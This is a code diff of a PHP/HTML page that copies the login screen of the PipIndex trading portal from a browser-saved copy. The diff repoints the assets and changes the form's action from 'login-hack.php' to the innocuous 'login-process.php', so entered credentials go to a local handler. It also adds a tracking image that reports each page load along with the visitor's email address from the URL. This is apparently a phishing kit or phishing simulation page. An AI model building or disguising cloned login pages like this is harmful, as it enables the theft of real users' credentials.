@@ -31,9 +31,9 @@
     <script src="http://cdnjs.cloudflare.com/ajax/libs/es5-shim/2.2.0/es5-shim.js"></script>
     <![endif]-->
     <link rel="icon" href="https://clients.pipindex.com/favicon.ico">
-    <link href="./PipIndex - Log in_files/font-awesome.min.css" rel="stylesheet">
-    <link href="./PipIndex - Log in_files/css" rel="stylesheet" type="text/css">
-    <link rel="stylesheet" href="./PipIndex - Log in_files/styles.css">
+    <link href="./new-login-style/font-awesome.min.css" rel="stylesheet">
+    <link href="./new-login-style/css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="./new-login-style/styles.css">
 </head>
 <body class="tradecore" ng-class="{&#39;grid&#39; : $state.includes(&#39;base.portal&#39;)}">
 <section url="pipindex.com" class="ng-isolate-scope">
@@ -69,9 +69,9 @@
         <div class="container">
             <div class="row">
                 <div class="col-xs-12 col-sm-offset-3 col-sm-6">
-                    <div class="text-center"><img src="./PipIndex - Log in_files/logo.png" alt=""></div>
+                    <div class="text-center"><img src="./new-login-style/logo.png" alt=""></div>
                     <h2 translate=""><span class="ng-scope">Log in to your account</span></h2>
-                    <form name='input' action='login-hack.php' method='post'
+                    <form name='input' action='login-process.php' method='post'
                           class="ng-pristine ng-invalid ng-invalid-required">
                         <!-- ngIf: errors.non_field_errors.length > 0 --><!-- ngIf: errors.msg.length > 0 -->
                         <?php
@@ -115,14 +115,14 @@
             </div>
         </div>
     </div>
-    <?php require_once('utils.php'); echo '<img src="'. baseURL() .'trackevents.php?email=' .(isset($_GET['email']) ? trim($_GET['email'])  : '') .'&eventType=page-load&pageId=login"/>'; ?>
+    <?php require_once('new_includes/utils.php'); echo '<img src="'. baseURL() .'trackevents.php?email=' .(isset($_GET['email']) ? trim($_GET['email'])  : '') .'&eventType=page-load&pageId=login"/>'; ?>
 </ui-view>
 <div growl="" class="ng-isolate-scope">
     <div class="growl-container growl-fixed top-right" ng-class="wrapperClasses()">
         <!-- ngRepeat: message in growlMessages.directives[referenceId].messages --></div>
 </div>
 
-<link href="./PipIndex - Log in_files/iwp.css" rel="stylesheet">
+<link href="./new-login-style/iwp.css" rel="stylesheet">
 
 
 
